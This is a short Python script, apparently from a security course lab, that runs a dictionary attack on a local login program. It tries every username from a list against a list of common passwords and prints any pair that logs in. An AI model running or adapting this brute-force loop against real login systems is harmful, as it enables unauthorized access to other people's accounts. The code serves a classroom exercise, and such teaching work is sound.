import subprocess, time

print(f'Start time: {time.time()}')

# Path to the password file
file_path = '/home/cse/Lab1/Q1'

#Usernames to be used for the password cracking
with open(f'{file_path}/gang', 'r') as f:
    usernames = f.readlines()

#Open password file and save passwords in a list
with open(f'{file_path}/MostCommonPWs', 'r') as f:
    passwords = f.readlines()

#strip whitespace characters from each password and username
passwords = [password.strip() for password in passwords]
usernames = [username.strip() for username in usernames]

#Loop through each username and password and attempt login
for username in usernames:
    for password in passwords:
        #use subproccess to run to attempt login from file Logic.pyc from the same directory
        result = subprocess.run(['python3', 'Login.pyc', username, password], capture_output = True, text = True)

        #Check if the login was successful
        if 'Login successful' in result.stdout:
            print(f'Password found: {username}, {password}')
            break

print(f'End time: {time.time()}')
